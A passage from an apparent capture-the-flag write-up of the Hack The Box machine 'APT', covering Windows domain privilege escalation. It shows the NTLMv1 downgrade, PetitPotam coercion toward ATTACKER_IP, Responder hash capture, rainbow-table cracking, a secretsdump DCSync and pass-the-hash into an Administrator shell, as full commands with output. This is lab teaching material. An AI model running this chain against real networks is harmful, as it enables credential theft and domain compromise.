+<a id="__codelineno-22-17" name="__codelineno-22-17" href="#__codelineno-22-17"></a><span class="n">09</span><span class="p">/</span><span class="n">24</span><span class="p">/</span><span class="n">2020</span>  <span class="n">09</span><span class="p">:</span><span class="n">17</span> <span class="n">AM</span>    <span class="p">&lt;</span><span class="n">DIR</span><span class="p">&gt;</span>          <span class="n">Links</span>
+<a id="__codelineno-22-18" name="__codelineno-22-18" href="#__codelineno-22-18"></a><span class="n">09</span><span class="p">/</span><span class="n">24</span><span class="p">/</span><span class="n">2020</span>  <span class="n">08</span><span class="p">:</span><span class="n">40</span> <span class="n">AM</span>    <span class="p">&lt;</span><span class="n">JUNCTION</span><span class="p">&gt;</span>     <span class="n">Local</span> <span class="n">Settings</span> <span class="p">[</span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">henry</span><span class="p">.</span><span class="n">vinson_adm</span><span class="p">\</span><span class="n">AppData</span><span class="p">\</span><span class="n">Local</span><span class="p">]</span>
+<a id="__codelineno-22-19" name="__codelineno-22-19" href="#__codelineno-22-19"></a><span class="n">09</span><span class="p">/</span><span class="n">24</span><span class="p">/</span><span class="n">2020</span>  <span class="n">09</span><span class="p">:</span><span class="n">17</span> <span class="n">AM</span>    <span class="p">&lt;</span><span class="n">DIR</span><span class="p">&gt;</span>          <span class="n">Music</span>
+<a id="__codelineno-22-20" name="__codelineno-22-20" href="#__codelineno-22-20"></a><span class="n">09</span><span class="p">/</span><span class="n">24</span><span class="p">/</span><span class="n">2020</span>  <span class="n">08</span><span class="p">:</span><span class="n">40</span> <span class="n">AM</span>    <span class="p">&lt;</span><span class="n">JUNCTION</span><span class="p">&gt;</span>     <span class="n">My</span> <span class="n">Documents</span> <span class="p">[</span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">henry</span><span class="p">.</span><span class="n">vinson_adm</span><span class="p">\</span><span class="n">Documents</span><span class="p">]</span>
+<a id="__codelineno-22-21" name="__codelineno-22-21" href="#__codelineno-22-21"></a><span class="n">09</span><span class="p">/</span><span class="n">24</span><span class="p">/</span><span class="n">2020</span>  <span class="n">08</span><span class="p">:</span><span class="n">40</span> <span class="n">AM</span>    <span class="p">&lt;</span><span class="n">JUNCTION</span><span class="p">&gt;</span>     <span class="n">NetHood</span> <span class="p">[</span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">henry</span><span class="p">.</span><span class="n">vinson_adm</span><span class="p">\</span><span class="n">AppData</span><span class="p">\</span><span class="n">Roaming</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Network</span> <span class="n">Shortcuts</span><span class="p">]</span>
+<a id="__codelineno-22-22" name="__codelineno-22-22" href="#__codelineno-22-22"></a><span class="n">03</span><span class="p">/</span><span class="n">31</span><span class="p">/</span><span class="n">2026</span>  <span class="n">02</span><span class="p">:</span><span class="n">58</span> <span class="n">AM</span>           <span class="n">262</span><span class="p">,</span><span class="n">144</span> <span class="n">NTUSER</span><span class="p">.</span><span class="n">DAT</span>
+<a id="__codelineno-22-23" name="__codelineno-22-23" href="#__codelineno-22-23"></a>
+<a id="__codelineno-22-24" name="__codelineno-22-24" href="#__codelineno-22-24"></a><span class="p">&lt;</span><span class="n">SNIP</span><span class="p">&gt;</span>
+<a id="__codelineno-22-25" name="__codelineno-22-25" href="#__codelineno-22-25"></a>
+<a id="__codelineno-22-26" name="__codelineno-22-26" href="#__codelineno-22-26"></a> <span class="n">Directory</span> <span class="n">of</span> <span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">henry</span><span class="p">.</span><span class="n">vinson_adm</span><span class="p">\</span><span class="n">AppData</span><span class="p">\</span><span class="n">Roaming</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">PowerShell</span><span class="p">\</span><span class="n">PSReadline</span>
+<a id="__codelineno-22-27" name="__codelineno-22-27" href="#__codelineno-22-27"></a>
+<a id="__codelineno-22-28" name="__codelineno-22-28" href="#__codelineno-22-28"></a><span class="n">11</span><span class="p">/</span><span class="n">10</span><span class="p">/</span><span class="n">2020</span>  <span class="n">11</span><span class="p">:</span><span class="n">58</span> <span class="n">AM</span>    <span class="p">&lt;</span><span class="n">DIR</span><span class="p">&gt;</span>          <span class="p">.</span>
+<a id="__codelineno-22-29" name="__codelineno-22-29" href="#__codelineno-22-29"></a><span class="n">11</span><span class="p">/</span><span class="n">10</span><span class="p">/</span><span class="n">2020</span>  <span class="n">11</span><span class="p">:</span><span class="n">58</span> <span class="n">AM</span>    <span class="p">&lt;</span><span class="n">DIR</span><span class="p">&gt;</span>          <span class="p">..</span>
+<a id="__codelineno-22-30" name="__codelineno-22-30" href="#__codelineno-22-30"></a><span class="n">11</span><span class="p">/</span><span class="n">10</span><span class="p">/</span><span class="n">2020</span>  <span class="n">11</span><span class="p">:</span><span class="n">58</span> <span class="n">AM</span>               <span class="n">458</span> <span class="n">ConsoleHost_history</span><span class="p">.</span><span class="n">txt</span>
+<a id="__codelineno-22-31" name="__codelineno-22-31" href="#__codelineno-22-31"></a>               <span class="n">1</span> <span class="n">File</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>            <span class="n">458</span> <span class="n">bytes</span>
+<a id="__codelineno-22-32" name="__codelineno-22-32" href="#__codelineno-22-32"></a>
+<a id="__codelineno-22-33" name="__codelineno-22-33" href="#__codelineno-22-33"></a><span class="p">&lt;</span><span class="n">SNIP</span><span class="p">&gt;</span>
+</code></pre></div>
+While digging through the AppData folder, I found a ConsoleHost_history.txt in the PSReadline directory. This folder stores the history of PowerShell commands executed by the user, which is a common place to find leaked credentials or sensitive configurations.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="n">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">henry</span><span class="p">.</span><span class="n">vinson_adm</span><span class="p">&gt;</span> <span class="nb">type </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">henry</span><span class="p">.</span><span class="n">vinson_adm</span><span class="p">\</span><span class="n">AppData</span><span class="p">\</span><span class="n">Roaming</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">PowerShell</span><span class="p">\</span><span class="n">PSReadline</span><span class="p">\</span><span class="n">ConsoleHost_history</span><span class="p">.</span><span class="n">txt</span>
+<a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a><span class="nv">$Cred</span> <span class="p">=</span> <span class="nb">get-credential</span> <span class="n">administrator</span>
+<a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a><span class="nb">invoke-command</span> <span class="n">-credential</span> <span class="nv">$Cred</span> <span class="n">-computername</span> <span class="n">localhost</span> <span class="n">-scriptblock</span> <span class="p">{</span><span class="nb">Set-ItemProperty</span> <span class="n">-Path</span> <span class="s2">"HKLM:\SYSTEM\CurrentControlSet\Control\Lsa"</span> <span class="n">lmcompatibilitylevel</span> <span class="n">-Type</span> <span class="n">DWORD</span> <span class="n">-Value</span> <span class="n">2</span> <span class="n">-Force</span><span class="p">}</span>
+</code></pre></div>
+<p>Someone ran this as Administrator. The command sets <code>lmcompatibilitylevel = 2</code>, which <strong>enables NTLMv1</strong> authentication. We verify it's still active:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="n">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">henry</span><span class="p">.</span><span class="n">vinson_adm</span><span class="p">&gt;</span> <span class="nb">Get-ItemProperty</span> <span class="n">-Path</span> <span class="s2">"HKLM:\SYSTEM\CurrentControlSet\Control\Lsa"</span> <span class="n">-Name</span> <span class="n">lmcompatibilitylevel</span>
+<a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a>
+<a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a>
+<a id="__codelineno-24-4" name="__codelineno-24-4" href="#__codelineno-24-4"></a><span class="n">lmcompatibilitylevel</span> <span class="p">:</span> <span class="n">2</span>
+<a id="__codelineno-24-5" name="__codelineno-24-5" href="#__codelineno-24-5"></a><span class="n">PSPath</span>               <span class="p">:</span> <span class="n">Microsoft</span><span class="p">.</span><span class="n">PowerShell</span><span class="p">.</span><span class="n">Core</span><span class="p">\</span><span class="n">Registry</span><span class="p">::</span><span class="n">HKEY_LOCAL_MACHINE</span><span class="p">\</span><span class="n">SYSTEM</span><span class="p">\</span><span class="n">CurrentControlSet</span><span class="p">\</span><span class="n">Control</span><span class="p">\</span><span class="n">Lsa</span>
+<a id="__codelineno-24-6" name="__codelineno-24-6" href="#__codelineno-24-6"></a><span class="n">PSParentPath</span>         <span class="p">:</span> <span class="n">Microsoft</span><span class="p">.</span><span class="n">PowerShell</span><span class="p">.</span><span class="n">Core</span><span class="p">\</span><span class="n">Registry</span><span class="p">::</span><span class="n">HKEY_LOCAL_MACHINE</span><span class="p">\</span><span class="n">SYSTEM</span><span class="p">\</span><span class="n">CurrentControlSet</span><span class="p">\</span><span class="n">Control</span>
+<a id="__codelineno-24-7" name="__codelineno-24-7" href="#__codelineno-24-7"></a><span class="n">PSChildName</span>          <span class="p">:</span> <span class="n">Lsa</span>
+<a id="__codelineno-24-8" name="__codelineno-24-8" href="#__codelineno-24-8"></a><span class="n">PSDrive</span>              <span class="p">:</span> <span class="n">HKLM</span>
+<a id="__codelineno-24-9" name="__codelineno-24-9" href="#__codelineno-24-9"></a><span class="n">PSProvider</span>           <span class="p">:</span> <span class="n">Microsoft</span><span class="p">.</span><span class="n">PowerShell</span><span class="p">.</span><span class="n">Core</span><span class="p">\</span><span class="n">Registry</span>
+</code></pre></div>
+<h4 id="why-does-this-matter">Why does this matter?<a class="headerlink" href="#why-does-this-matter" title="Permanent link">&para;</a></h4>
+<p>NTLMv1 is architecturally broken. It relies on DES with a 56-bit key, meaning any captured NTLMv1 hash can be cracked in seconds via Rainbow Tables (like ntlmv1.com), regardless of how long or complex the password is. In contrast, NTLMv2 implements proper salted hashing, making it significantly harder to crack and impossible to decrypt using pre-computed tables.
+<strong>The Downgrade Logic:</strong> Setting <code>lmcompatibilitylevel = 2</code> tells Windows to send NTLMv1 responses but still accept NTLMv2 if requested by the server. By using Responder, we act as the "server" in this exchange and specifically request NTLMv1. This forces the client to downgrade its authentication to the weakest level, allowing us to capture a hash that is susceptible to rainbow table attacks.</p>
+<p>With NTLMv1 enabled, the attack chain is:
+1. <strong>PetitPotam</strong> — Coerce the Domain Controller to authenticate to our machine via MS-EFSRPC.
+2. <strong>Responder</strong> — Capture the DC's NTLMv1 authentication response.
+3. <strong>Rainbow tables</strong> — Submit the hash to ntlmv1.com for instant decryption, recovering the machine account password or NT hash.</p>
+<h3 id="step-1-configure-responder-with-a-fixed-challenge">Step 1 — Configure Responder with a Fixed Challenge<a class="headerlink" href="#step-1-configure-responder-with-a-fixed-challenge" title="Permanent link">&para;</a></h3>
+<p>For the rainbow table attack to work, we need to capture the hash with a <strong>known, fixed challenge</strong>. By default Responder generates a random one per request, which would make rainbow table lookup impossible. We set it to <code>1122334455667788</code> in the config:</p>
+<p><img alt="Responder.conf with Challenge = 1122334455667788" src="../img/APT_0003.png" /></p>
+<h3 id="step-2-force-authentication-with-petitpotam">Step 2 — Force Authentication with PetitPotam<a class="headerlink" href="#step-2-force-authentication-with-petitpotam" title="Permanent link">&para;</a></h3>
+<p>PetitPotam abuses the MS-EFSRPC protocol (<code>EfsRpcOpenFileRaw</code>) to make a target Windows machine authenticate against an attacker-controlled server — without needing admin rights in many cases:</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>python3<span class="w"> </span>PetitPotam.py<span class="w"> </span>-u<span class="w"> </span><span class="s1">'henry.vinson_adm'</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">'&lt;REDACTED&gt;'</span><span class="w"> </span>-d<span class="w"> </span><span class="s1">'htb.local'</span><span class="w"> </span>&lt;ATTACKER_IP&gt;<span class="w"> </span>apt6.htb
+<a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a><span class="w">  </span><span class="p">|</span><span class="w"> </span>_<span class="w"> </span><span class="se">\ </span><span class="w">  </span>___<span class="w">    </span><span class="p">|</span><span class="w"> </span><span class="p">|</span>_<span class="w">     </span><span class="o">(</span>_<span class="o">)</span><span class="w">    </span><span class="p">|</span><span class="w"> </span><span class="p">|</span>_<span class="w">     </span><span class="p">|</span><span class="w"> </span>_<span class="w"> </span><span class="se">\ </span><span class="w">  </span>___<span class="w">    </span><span class="p">|</span><span class="w"> </span><span class="p">|</span>_<span class="w">    </span>__<span class="w"> </span>_<span class="w">    </span>_<span class="w"> </span>__
+<a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a>
+<a id="__codelineno-25-4" name="__codelineno-25-4" href="#__codelineno-25-4"></a>
+<a id="__codelineno-25-5" name="__codelineno-25-5" href="#__codelineno-25-5"></a><span class="w">              </span>___<span class="w">            </span>_<span class="w">        </span>_<span class="w">      </span>_<span class="w">        </span>___<span class="w">            </span>_<span class="w">           </span>
+<a id="__codelineno-25-6" name="__codelineno-25-6" href="#__codelineno-25-6"></a><span class="w">             </span><span class="p">|</span><span class="w"> </span>_<span class="w"> </span><span class="se">\ </span><span class="w">  </span>___<span class="w">    </span><span class="p">|</span><span class="w"> </span><span class="p">|</span>_<span class="w">     </span><span class="o">(</span>_<span class="o">)</span><span class="w">    </span><span class="p">|</span><span class="w"> </span><span class="p">|</span>_<span class="w">     </span><span class="p">|</span><span class="w"> </span>_<span class="w"> </span><span class="se">\ </span><span class="w">  </span>___<span class="w">    </span><span class="p">|</span><span class="w"> </span><span class="p">|</span>_<span class="w">    </span>__<span class="w"> </span>_<span class="w">    </span>_<span class="w"> </span>__
+<a id="__codelineno-25-7" name="__codelineno-25-7" href="#__codelineno-25-7"></a><span class="w">             </span><span class="p">|</span><span class="w">  </span>_/<span class="w">  </span>/<span class="w"> </span>-_<span class="o">)</span><span class="w">   </span><span class="p">|</span><span class="w">  </span>_<span class="p">|</span><span class="w">    </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w">    </span><span class="p">|</span><span class="w">  </span>_<span class="p">|</span><span class="w">    </span><span class="p">|</span><span class="w">  </span>_/<span class="w">  </span>/<span class="w"> </span>_<span class="w"> </span><span class="se">\ </span><span class="w">  </span><span class="p">|</span><span class="w">  </span>_<span class="p">|</span><span class="w">  </span>/<span class="w"> </span>_<span class="sb">`</span><span class="w"> </span><span class="p">|</span><span class="w">  </span><span class="p">|</span><span class="w"> </span><span class="s1">'  \</span>
+<a id="__codelineno-25-8" name="__codelineno-25-8" href="#__codelineno-25-8"></a><span class="s1">            _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_|</span>
+<a id="__codelineno-25-9" name="__codelineno-25-9" href="#__codelineno-25-9"></a><span class="s1">          _| """ |_|"""""|_|"""""|_|"""""|_|"""""|_| """ |_|"""""|_|"""""|_|"""""|_|"""""|</span>
+<a id="__codelineno-25-10" name="__codelineno-25-10" href="#__codelineno-25-10"></a><span class="s1">          "`-0-0-'</span><span class="s2">"`-0-0-'"</span><span class="sb">`</span>-0-0-<span class="s1">'"`-0-0-'</span><span class="s2">"`-0-0-'"</span><span class="sb">`</span>-0-0-<span class="s1">'"`-0-0-'</span><span class="s2">"`-0-0-'"</span><span class="sb">`</span>-0-0-<span class="s1">'"`-0-0-'</span>
+<a id="__codelineno-25-11" name="__codelineno-25-11" href="#__codelineno-25-11"></a>
+<a id="__codelineno-25-12" name="__codelineno-25-12" href="#__codelineno-25-12"></a><span class="w">              </span>PoC<span class="w"> </span>to<span class="w"> </span>elicit<span class="w"> </span>machine<span class="w"> </span>account<span class="w"> </span>authentication<span class="w"> </span>via<span class="w"> </span>some<span class="w"> </span>MS-EFSRPC<span class="w"> </span>functions
+<a id="__codelineno-25-13" name="__codelineno-25-13" href="#__codelineno-25-13"></a><span class="w">                                      </span>by<span class="w"> </span>topotam<span class="w"> </span><span class="o">(</span>@topotam77<span class="o">)</span>
+<a id="__codelineno-25-14" name="__codelineno-25-14" href="#__codelineno-25-14"></a>
+<a id="__codelineno-25-15" name="__codelineno-25-15" href="#__codelineno-25-15"></a><span class="w">                     </span>Inspired<span class="w"> </span>by<span class="w"> </span>@tifkin_<span class="w"> </span><span class="p">&amp;</span><span class="w"> </span>@elad_shamir<span class="w"> </span>previous<span class="w"> </span>work<span class="w"> </span>on<span class="w"> </span>MS-RPRN
+<a id="__codelineno-25-16" name="__codelineno-25-16" href="#__codelineno-25-16"></a>
+<a id="__codelineno-25-17" name="__codelineno-25-17" href="#__codelineno-25-17"></a>
+<a id="__codelineno-25-18" name="__codelineno-25-18" href="#__codelineno-25-18"></a>
+<a id="__codelineno-25-19" name="__codelineno-25-19" href="#__codelineno-25-19"></a>Trying<span class="w"> </span>pipe<span class="w"> </span>lsarpc
+<a id="__codelineno-25-20" name="__codelineno-25-20" href="#__codelineno-25-20"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Connecting<span class="w"> </span>to<span class="w"> </span>ncacn_np:apt6.htb<span class="o">[</span><span class="se">\P</span>IPE<span class="se">\l</span>sarpc<span class="o">]</span>
+<a id="__codelineno-25-21" name="__codelineno-25-21" href="#__codelineno-25-21"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Connected!
+<a id="__codelineno-25-22" name="__codelineno-25-22" href="#__codelineno-25-22"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Binding<span class="w"> </span>to<span class="w"> </span>c681d488-d850-11d0-8c52-00c04fd90f7e
+<a id="__codelineno-25-23" name="__codelineno-25-23" href="#__codelineno-25-23"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Successfully<span class="w"> </span>bound!
+<a id="__codelineno-25-24" name="__codelineno-25-24" href="#__codelineno-25-24"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Sending<span class="w"> </span>EfsRpcOpenFileRaw!
+<a id="__codelineno-25-25" name="__codelineno-25-25" href="#__codelineno-25-25"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Got<span class="w"> </span>expected<span class="w"> </span>ERROR_BAD_NETPATH<span class="w"> </span>exception!!
+<a id="__codelineno-25-26" name="__codelineno-25-26" href="#__codelineno-25-26"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Attack<span class="w"> </span>worked!
+</code></pre></div>
+In the other terminal:
+<div class="highlight"><pre><span></span><code><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>sudo<span class="w"> </span>responder<span class="w"> </span>-I<span class="w"> </span>tun0<span class="w"> </span>--lm<span class="w"> </span>-v
+<a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a>
+<a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a>&lt;SNIP&gt;
+<a id="__codelineno-26-4" name="__codelineno-26-4" href="#__codelineno-26-4"></a>
+<a id="__codelineno-26-5" name="__codelineno-26-5" href="#__codelineno-26-5"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Listening<span class="w"> </span><span class="k">for</span><span class="w"> </span>events...
+<a id="__codelineno-26-6" name="__codelineno-26-6" href="#__codelineno-26-6"></a>
+<a id="__codelineno-26-7" name="__codelineno-26-7" href="#__codelineno-26-7"></a><span class="o">[</span>!<span class="o">]</span><span class="w"> </span>Error<span class="w"> </span>starting<span class="w"> </span>TCP<span class="w"> </span>server<span class="w"> </span>on<span class="w"> </span>port<span class="w"> </span><span class="m">53</span>,<span class="w"> </span>check<span class="w"> </span>permissions<span class="w"> </span>or<span class="w"> </span>other<span class="w"> </span>servers<span class="w"> </span>running.
+<a id="__codelineno-26-8" name="__codelineno-26-8" href="#__codelineno-26-8"></a><span class="o">[</span>SMB<span class="o">]</span><span class="w"> </span>NTLMv1<span class="w"> </span>Client<span class="w">   </span>:<span class="w"> </span><span class="m">10</span>.129.96.60
+<a id="__codelineno-26-9" name="__codelineno-26-9" href="#__codelineno-26-9"></a><span class="o">[</span>SMB<span class="o">]</span><span class="w"> </span>NTLMv1<span class="w"> </span>Username<span class="w"> </span>:<span class="w"> </span>HTB<span class="se">\A</span>PT$
+<a id="__codelineno-26-10" name="__codelineno-26-10" href="#__codelineno-26-10"></a><span class="o">[</span>SMB<span class="o">]</span><span class="w"> </span>NTLMv1<span class="w"> </span>Hash<span class="w">     </span>:<span class="w"> </span>APT$::HTB:&lt;REDACTED_HASH&gt;
+</code></pre></div></p>
+<h3 id="step-3-crack-with-rainbow-tables">Step 3 — Crack with Rainbow Tables<a class="headerlink" href="#step-3-crack-with-rainbow-tables" title="Permanent link">&para;</a></h3>
+<p>We tried <code>hashcat</code> with rockyou.txt first and it exhausted the wordlist without success. Machine account passwords are random and complex by design.</p>
+<p>Instead, we use <a href="https://ntlmv1.com/">ntlmv1.com</a>. Since we used the fixed challenge <code>1122334455667788</code>, the site can look up the NT hash directly from precomputed rainbow tables. We submit the <code>NTLMResponse</code> portion and select <code>Net-NTLMv1</code>:</p>
+<p><img alt="ntlmv1.com with the hash loaded and Net-NTLMv1 selected" src="../img/APT_0004.png" /></p>
+<p>The result comes back instantly in the Tasks tab:</p>
+<p><img alt="ntlmv1.com Tasks showing the cracked NT hash of APT$" src="../img/APT_0005.png" /></p>
+<p>The <strong>NT hash of the <code>APT$</code> machine account</strong> is <code>&lt;REDACTED_HASH&gt;</code>.</p>
+<hr />
+<h2 id="dcsync-as-apt-administrator-hash">DCSync as APT$ — Administrator Hash<a class="headerlink" href="#dcsync-as-apt-administrator-hash" title="Permanent link">&para;</a></h2>
+<p>Machine accounts in AD have replication privileges. We use <code>APT$</code>'s NT hash to perform a <strong>DCSync</strong> and pull the Administrator's credentials directly:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>secretsdump.py<span class="w"> </span><span class="s1">'htb.local/APT$@apt6.htb'</span><span class="w"> </span>-hashes<span class="w"> </span>:&lt;REDACTED_HASH&gt;<span class="w"> </span>-just-dc-user<span class="w"> </span>Administrator
+<a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a>Impacket<span class="w"> </span>v0.13.0<span class="w"> </span>-<span class="w"> </span>Copyright<span class="w"> </span>Fortra,<span class="w"> </span>LLC<span class="w"> </span>and<span class="w"> </span>its<span class="w"> </span>affiliated<span class="w"> </span>companies
+<a id="__codelineno-27-3" name="__codelineno-27-3" href="#__codelineno-27-3"></a>
+<a id="__codelineno-27-4" name="__codelineno-27-4" href="#__codelineno-27-4"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Dumping<span class="w"> </span>Domain<span class="w"> </span>Credentials<span class="w"> </span><span class="o">(</span>domain<span class="se">\u</span>id:rid:lmhash:nthash<span class="o">)</span>
+<a id="__codelineno-27-5" name="__codelineno-27-5" href="#__codelineno-27-5"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Using<span class="w"> </span>the<span class="w"> </span>DRSUAPI<span class="w"> </span>method<span class="w"> </span>to<span class="w"> </span>get<span class="w"> </span>NTDS.DIT<span class="w"> </span>secrets
+<a id="__codelineno-27-6" name="__codelineno-27-6" href="#__codelineno-27-6"></a>Administrator:500:aad3b435b51404eeaad3b435b51404ee:&lt;REDACTED_HASH&gt;:::
+<a id="__codelineno-27-7" name="__codelineno-27-7" href="#__codelineno-27-7"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Kerberos<span class="w"> </span>keys<span class="w"> </span>grabbed
+<a id="__codelineno-27-8" name="__codelineno-27-8" href="#__codelineno-27-8"></a>Administrator:aes256-cts-hmac-sha1-96:&lt;REDACTED_HASH&gt;
+<a id="__codelineno-27-9" name="__codelineno-27-9" href="#__codelineno-27-9"></a>Administrator:aes128-cts-hmac-sha1-96:&lt;REDACTED_HASH&gt;
+<a id="__codelineno-27-10" name="__codelineno-27-10" href="#__codelineno-27-10"></a>Administrator:des-cbc-md5:&lt;REDACTED_HASH&gt;
+<a id="__codelineno-27-11" name="__codelineno-27-11" href="#__codelineno-27-11"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Cleaning<span class="w"> </span>up...
+</code></pre></div>
+<hr />
+<h2 id="shell-as-administrator-root-flag">Shell as Administrator — Root Flag<a class="headerlink" href="#shell-as-administrator-root-flag" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>evil-winrm<span class="w"> </span>-i<span class="w"> </span>apt6.htb<span class="w"> </span>-u<span class="w"> </span>Administrator<span class="w"> </span>-H<span class="w"> </span>&lt;REDACTED_HASH&gt;
+<a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a>
+<a id="__codelineno-28-3" name="__codelineno-28-3" href="#__codelineno-28-3"></a>*Evil-WinRM*<span class="w"> </span>PS<span class="w"> </span>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt;<span class="w"> </span><span class="nb">type</span><span class="w"> </span>..<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
+<a id="__codelineno-28-4" name="__codelineno-28-4" href="#__codelineno-28-4"></a>&lt;ROOT_FLAG&gt;
+</code></pre></div>
+<p>Rooted!</p>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        
+<footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      Copyright &copy; 2026 Jose Raul Bongiovani
+    </div>
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+<div class="md-social">
+  
+    
+    
+    
+    
+    <a href="https://github.com/b0nyo" target="_blank" rel="noopener" title="GitHub" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.0.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+    </a>
+  
+    
+    
+    
+    
